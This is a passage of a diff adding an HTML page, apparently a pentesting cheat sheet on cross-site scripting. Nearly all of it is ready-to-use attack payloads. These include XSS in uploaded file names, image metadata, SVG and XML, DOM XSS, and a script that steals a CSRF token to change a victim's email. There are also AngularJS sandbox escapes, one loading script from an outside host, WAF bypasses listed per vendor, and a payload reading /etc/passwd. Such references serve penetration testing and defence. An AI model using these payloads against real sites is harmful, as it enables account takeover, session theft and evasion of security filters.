+&lt;img src=&quot;xasdasdasd&quot; onerror=&quot;document.write(&#39;&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;&#39;)&quot;/&gt;
+&lt;script&gt;document.write(&#39;&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;&#39;);&lt;/scrip&gt;
+</code></pre></div>
+<h2 id="xss-in-files">XSS in files</h2>
+<div class="highlight"><pre><span></span><code># XSS in filename:
+&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;.gif
+
+# XSS in metadata:
+exiftool -FIELD=XSS FILE
+exiftool -Artist=&#39; &quot;&gt;&lt;img src=1 onerror=alert(document.domain)&gt;&#39; brute.jpeg
+exiftool -Artist=&#39;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#39; dapos.jpeg
+
+# XSS in GIF Magic Number:
+GIF89a/*&lt;svg/onload=alert(1)&gt;*/=alert(document.domain)//;
+# If image can&#39;t load:
+url.com/test.php?p=&lt;script src=http://url.com/upload/img/xss.gif&gt;
+
+# XSS in png:
+https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/
+
+# XSS in PDF:
+https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?m=1
+
+# XSS upload filename:
+cp somefile.txt \&quot;\&gt;\&lt;img\ src\ onerror=prompt\(1\)\&gt;
+&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;.png
+&quot;&gt;&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;.png
+&quot;&gt;&lt;svg onmouseover=alert(1)&gt;.svg
+&lt;&lt;script&gt;alert(&#39;xss&#39;)&lt;!--a--&gt;a.png
+&quot;&gt;&lt;svg onload=alert(1)&gt;.gif
+
+# XSS Svg Image upload
+&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;
+   &lt;script type=&quot;text/javascript&quot;&gt;
+      alert(&#39;XSS!&#39;);
+   &lt;/script&gt;
+&lt;/svg&gt;
+
+# XSS svg image upload 2
+# If you&#39;re testing a text editor on a system that you can also upload files to, try to embed an svg:
+&lt;iframe src=&quot;https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/movingcart_1.svg&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;
+#If that works, upload an SVG with the following content and try rendering it using the text editor:
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+    &lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;/svg&gt;
+
+# XSS in SVG 3:
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(document.domain)&quot;/&gt;
+
+# XSS in XML
+&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;something:script xmlns:something=&quot;http://www.w3.org/1999/xhtml&quot;&gt;alert(1)&lt;/something:script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+# https://brutelogic.com.br/blog/file-upload-xss/
+
+&quot; =&quot;&quot; &#39;&gt;&lt;/&gt;&lt;script&gt;&lt;/script&gt;&lt;svg onload&quot;=&quot;alertonload=alert(1)&quot;&quot; onload=setInterval&#39;alert\x28document.domain\x29&#39;
+
+# XSS in existent jpeg:
+exiftool -Artist=&#39;&quot;&gt;&lt;svg onload=alert(1)&gt;&#39; xss.jpeg
+
+# XSS in url (and put as header)
+http://acme.corp/?redir=[URI_SCHEME]://gremwell.com%0A%0A[XSS_PAYLOAD]
+
+# XSS in XML
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;html xmlns:html=&quot;http://w3.org/1999/xhtml&quot;&gt;
+&lt;html:script&gt;prompt(document.domain);&lt;/html:script&gt;
+&lt;/html&gt;
+</code></pre></div>
+<h2 id="dom-xss"><strong>DOM XSS</strong></h2>
+<div class="highlight"><pre><span></span><code>&lt;img src=1 onerror=alert(1)&gt;
+&lt;iframe src=javascript:alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;svg&gt;&lt;svg onload=alert(1)&gt;
+data:text/html,&lt;img src=1 onerror=alert(1)&gt;
+data:text/html,&lt;iframe src=javascript:alert(1)&gt;
+&lt;iframe src=TARGET_URL onload=&quot;frames[0].postMessage(&#39;INJECTION&#39;,&#39;*&#39;)&quot;&gt;
+&quot;&gt;&lt;svg onload=alert(1)&gt;
+javascript:alert(document.cookie)
+\&quot;-alert(1)}//
+</code></pre></div>
+<h2 id="xss-to-csrf"><strong>XSS to CSRF</strong></h2>
+<div class="highlight"><pre><span></span><code># Example:
+
+# Detect action to change email, with anti csrf token, get it and paste this in a comment to change user email:
+
+&lt;script&gt;
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open(&#39;get&#39;,&#39;/email&#39;,true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name=&quot;csrf&quot; value=&quot;(\w+)&quot;/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open(&#39;post&#39;, &#39;/email/change-email&#39;, true);
+    changeReq.send(&#39;csrf=&#39;+token+&#39;&amp;email=test@test.com&#39;)
+};
+&lt;/script&gt;
+</code></pre></div>
+<h2 id="angularjs-sandbox"><strong>AngularJS Sandbox</strong></h2>
+<div class="highlight"><pre><span></span><code># Removed in AngularJS 1.6
+# Is a way to avoid some strings like window, document or __proto__.
+
+# Without strings:
+/?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+
+# With CSP:
+
+&lt;script&gt;
+location=&#39;https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x&#39;;
+&lt;/script&gt;
+
+# v 1.6 and up
+{{$new.constructor(&#39;alert(1)&#39;)()}}
+&lt;x ng-app&gt;{{$new.constructor(&#39;alert(1)&#39;)()}}
+
+{{constructor.constructor(&#39;alert(1)&#39;)()}}
+{{constructor.constructor(&#39;import(&quot;https://six2dez.xss.ht&quot;)&#39;)()}}
+{{$on.constructor(&#39;alert(1)&#39;)()}}
+{{{}.&quot;)));alert(1)//&quot;}}
+{{{}.&quot;)));alert(1)//&quot;}}
+toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,11 4,116,40,49,41)
+</code></pre></div>
+<h2 id="xss-in-js"><strong>XSS in JS</strong></h2>
+<div class="highlight"><pre><span></span><code># Inside JS script:
+&lt;/script&gt;&lt;img src=1 onerror=alert(document.domain)&gt;
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Inside JS literal script:
+&#39;-alert(document.domain)-&#39;
+&#39;;alert(document.domain)//
+&#39;-alert(1)-&#39;
+
+# Inside JS that escape special chars:
+If &#39;;alert(document.domain)// is converted in \&#39;;alert(document.domain)//
+Use \&#39;;alert(document.domain)// to obtain \\&#39;;alert(document.domain)//
+\&#39;-alert(1)//
+
+# Inside JS with some char blocked:
+onerror=alert;throw 1
+/post?postId=5&amp;%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+
+# Inside {}
+${alert(document.domain)}
+${alert(1)}
+</code></pre></div>
+<h2 id="xss-waf-bypasses">XSS Waf Bypasses</h2>
+<div class="highlight"><pre><span></span><code># Only lowercase block
+&lt;sCRipT&gt;alert(1)&lt;/sCRipT&gt;
+
+# Break regex
+&lt;script&gt;%0aalert(1)&lt;/script&gt;
+
+# Double encoding
+%2522
+
+# Recursive filters
+&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
+
+# Inject anchor tag
+&lt;a/href=&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;asc&amp;Tab;ri&amp;Tab;pt:alert&amp;lpar;1&amp;rpar;&quot;&gt;
+
+# Bypass whitespaces
+&lt;svg·onload=alert(1)&gt;
+
+# Change GET to POST request
+
+# Imperva Incapsula
+%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
+&lt;img/src=&quot;x&quot;/onerror=&quot;[JS-F**K Payload]&quot;&gt;
+&lt;iframe/onload=&#39;this[&quot;src&quot;]=&quot;javas&amp;Tab;cript:al&quot;+&quot;ert``&quot;&#39;;&gt;&lt;img/src=q onerror=&#39;new Function`al\ert\`1\``&#39;&gt;
+
+# WebKnight
+&lt;details ontoggle=alert(1)&gt;
+&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;alert(1)&quot;&gt;
+
+# F5 Big IP
+&lt;body style=&quot;height:1000px&quot; onwheel=&quot;[DATA]&quot;&gt;
+&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;[DATA]&quot;&gt;
+&lt;body style=&quot;height:1000px&quot; onwheel=&quot;[JS-F**k Payload]&quot;&gt;
+&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;[JS-F**k Payload]&quot;&gt;
+&lt;body style=&quot;height:1000px&quot; onwheel=&quot;prom%25%32%33%25%32%36x70;t(1)&quot;&gt;
+&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;prom%25%32%33%25%32%36x70;t(1)&quot;&gt;
+
+# Barracuda WAF
+&lt;body style=&quot;height:1000px&quot; onwheel=&quot;alert(1)&quot;&gt;
+&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;alert(1)&quot;&gt;
+
+# PHP-IDS
+&lt;svg+onload=+&quot;[DATA]&quot;
+&lt;svg+onload=+&quot;aler%25%37%34(1)&quot;
+
+# Mod-Security
+&lt;a href=&quot;j[785 bytes of (&amp;NewLine;&amp;Tab;)]avascript:alert(1);&quot;&gt;XSS&lt;/a&gt;
+1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
+&lt;b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)&gt;
+
+# Quick Defense:
+&lt;input type=&quot;search&quot; onsearch=&quot;aler\u0074(1)&quot;&gt;
+&lt;details ontoggle=&quot;aler\u0074(1)&quot;&gt;
+
+# Sucuri WAF
+1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
+
+# Akamai
+1%3C/script%3E%3Csvg/onload=prompt(document[domain])%3E
+&lt;SCr%00Ipt&gt;confirm(1)&lt;/scR%00ipt&gt;
+# AngularJS
+{{constructor.constructor(alert 1 )()}} 
+</code></pre></div>
+<h2 id="xss-mindmap">XSS Mindmap</h2>
+<p><img alt="XSS Mindmap" src="../images/xss2.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.expand", "search.highlight", "search.share", "content.code.annotate", "content.tooltips", "toc.integrate"], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
